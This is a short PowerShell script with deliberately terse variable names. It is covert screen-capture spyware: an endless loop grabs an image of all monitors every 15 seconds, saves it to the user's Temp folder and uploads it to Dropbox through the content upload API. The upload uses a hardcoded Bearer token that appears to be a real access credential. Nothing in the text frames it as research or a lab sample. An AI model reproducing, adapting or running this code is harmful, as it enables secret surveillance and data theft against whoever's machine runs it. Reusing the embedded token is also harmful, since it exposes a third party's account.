function d { 
    [CmdletBinding()] 
    param ( 
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)] 
        [Alias("x")] 
        [string]$a 
    ) 
    $b = "sl.u.AFwhYiDT2OxLCKRgWjY26_NquIOPR9aJWqsr4fFAqQvedPDylvCW7R3TRjaol0KlP6hgfr0HXKduBvZVDwW77vFri4Se4EOHaOFyyag1K8pNBQoQjTI27IZ67fpj7rYT0oJBBUDnqWA7G38ozsCjQHNlor6gDL27T5T1Aq5jhrlnNnE6FcsRN3if718Qy4tnBh3nKT6g4sJBrxtc0zn4ECVwigSDzUFm_q7JGhkHPpWl5ZEPBgIrHYsoPnYw7QOI52s6GIhGY7elWwAS-K8IFgAx3CWeAhJrtrEPlw1k4neios0AKSwfBtzlqxnhAKhsA_Ily_EEp6018FfNDIhO8ADGEzFyakziwTkHHVXe1V_IOxtYUbV3yK0ukKpxCJavUNvoK5DEWk_g0dv4XlinFnM_GeIpbq7RsQw4-D80mkYOkAO7Tosiu6ig-0aLPWN5tGwAEfcPKGotaM_-CRq3ITlFuNkKVbZ3OAjoB8W-7RG1N2xPgjYwQoSYOp5a4L7Y75W4MEeTmlwclpwlmIcIMJiVXq8i4Us5rvQw3CZnZ-lCRuQWydCgclDZUMmjO19Vt5HGoGKjMQCdCupdtdD6B4Q2tfi3Qh_TL_9K5YYM6MKCmsR5goo4xfj5EStobIC-UbXeQw-Ra7oBQjGPIDxDZ7WRiQH1F-p7pDGRa6-41FGy40klrU7-CBIqky-p26L0AX35JAFIeDif9KOpEo99dBQq_t2pJ2Jm07Sj98VY-arR-YKtS3BMrJWjx6LCV8our_GTyghoqD6RkxRMY8xZMbLvlXzEr-fk5PAd0hFwOqPGs-400W5FnGUT0By9nzBvcMg-Ck_sCkOuqzjXE-V6g5o6iAKflap5f6Hfs8vw2WWS4-sXkA_i1_zmNd6GFdDkEVYVDQizB8nrUnTosoXCdpvsxrrUGwREKkDu-waLdYMJjKS7VZ3zRCY9MclwSopPP7dNmxtQ1d-hBFq12RZAau-MBWpa0NtrgnN0GzaBdahg8_BALiupl4-lZh04KG1a9UqRZVyZ_BO1XqEGMHqCNqnG4HOG7c1aOU8SwDubLnNvWg9eSfxWm4C3IhoI-SqdgvOahmtnyf8USxxctK8ca-yTI-bTym9lVD6-3ET7QxQf3W9oHNVbkZ6ezc7ewSO2LKYpClw5rYBvOoF8oiYyHE8Z8KEaKXiRumDDtNVoK0S9RNBi1WxMPca4-uaHHAed64L27jEXWb-DTuopwLJnMxa9n-kqFzAWtD91obbu_7p8bZg49FbkYK-C5rgEHrx8uKjJsAa1G0duLZs54NshFA5I2edQrvUwSR_xJRY5hRhyIy0qqH8GGYz-AlyZkTmV8P7IcTlas1xrS8u3WqNi9vDT2h2y6IopDqlgcB4JGOemZJ58YyjtG-9h5pxfYT07Q_DtQ6Gm1juLCelAZuHOdQJ-N2Pa--vkt08Orphq7zY7Pw"
    $c = Split-Path $a -leaf 
    $d = "/$c" 
    $e = '{ "path": "' + $d + '", "mode": "add", "autorename": true, "mute": false }' 
    $f = "Bearer " + $b 
    $g = New-Object "System.Collections.Generic.Dictionary[[String],[String]]" 
    $g.Add("Authorization", $f) 
    $g.Add("Dropbox-API-Arg", $e) 
    $g.Add("Content-Type", 'application/octet-stream') 
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $a -Headers $g 
} 

while(1){ 
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing 
    $s = [Windows.Forms.Screen]::AllScreens 
    $t = ($s.Bounds.Top | Measure-Object -Minimum).Minimum 
    $l = ($s.Bounds.Left | Measure-Object -Minimum).Minimum 
    $w = ($s.Bounds.Right | Measure-Object -Maximum).Maximum 
    $h = ($s.Bounds.Bottom | Measure-Object -Maximum).Maximum 
    $z = [Drawing.Rectangle]::FromLTRB($l, $t, $w, $h) 
    $i = New-Object System.Drawing.Bitmap ([int]$z.Width), ([int]$z.Height) 
    $j = [Drawing.Graphics]::FromImage($i) 
    $j.CopyFromScreen($z.Location, [Drawing.Point]::Empty, $z.Size) 
    $k = "$env:USERPROFILE\AppData\Local\Temp\$env:computername-C.png" 
    $i.Save($k) 
    $j.Dispose() 
    $i.Dispose() 
    Start-Sleep -Seconds 15 
    $k | d 
}
